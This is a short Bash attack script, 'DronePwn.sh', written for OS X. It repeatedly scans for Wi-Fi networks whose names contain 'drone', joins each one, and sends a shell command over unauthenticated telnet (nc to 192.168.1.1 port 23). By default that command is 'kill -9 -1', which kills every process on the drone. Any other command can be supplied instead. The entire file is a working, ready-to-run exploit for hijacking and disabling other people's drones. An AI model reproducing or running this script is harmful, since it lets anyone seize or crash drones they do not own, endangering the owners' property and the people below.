# DronePwn.sh
# Based on Darren Kitchen Conecpt
# Written for OS X 10.9 (but will probably work on most other versions)
# Written by Tesla while very bored
# Usage: bash dronepwn.sh [interface] [shell command to run on drone]
#        Both arguments are optional
#!/bin/bash
INTERFACE=''
COMMAND=''
ABRT_WHEN_POSSIBLE=false
function error {
	printf "\e[31m%s\e[39m\n" "$1"
}

function warn {
	printf "\e[33m%s\e[0m\n" "$1"
}

function log {
	printf "\e[34m%s\e[0m\n" "$1"
}

function good {
	printf "\e[1m\e[32m%s\e[0m\n" "$1"
}

function abrt {
	log "[*] Caught interrupt, finishing. . ."
	ABRT_WHEN_POSSIBLE=true
}

function pwn_network {
	if networksetup -setairportnetwork $INTERFACE $1 > /dev/null 2>/dev/null
		then
			log "[*] Success!"
			log "[*] Attemting to connect and issue kill command. . ."
			printf "$COMMAND\n\n" | nc 192.168.1.1 23
			log "[*] Moving to next AP (if any). . ."
		else
			error "[!] Failed to associate!"
		fi
}

function pwn_networks {
	for ntwrk in $1
	do
		log "[*] Attemting to associate with ESSID: ${ntwrk}. . ."
		pwn_network "${ntwrk}"
	done
}

trap abrt SIGINT

if [[ $ABRT_WHEN_POSSIBLE = true ]]; then exit 0; fi
if [[ -z $1 ]]
then
	log "[-] No interface specified, attemting to determine wireless interface (this will not work if you are currently not connected to a network). . ."
	INTERFACE=$(ifconfig | grep -v '127.0.0.1' | grep -v 'bridge' | grep -B3 -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | grep flags | awk '{print $1}' | sed 's/://g')
	good "[-] Selected $INTERFACE as wireless interface"
else
	INTERFACE=$1
fi
if [[ $ABRT_WHEN_POSSIBLE = true ]]; then exit 0; fi
if [[ -z $2 ]]
then
	COMMAND="kill -9 -1"
	log "[*] Custom command left blank, using \"kill -9 -1\""
else
	COMMAND=$2
fi
if [[ $ABRT_WHEN_POSSIBLE = true ]]; then exit 0; fi

while (true) do
	log "[*] Scanning for APs with ESSIDs that contain 'drone'. . ."
	ntwrks=( $(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s | grep 'drone' | awk '{print $1}') )
	pwn_networks "${ntwrks[@]}"
	if [[ $ABRT_WHEN_POSSIBLE = true ]]; then exit 0; fi
	sleep 1
done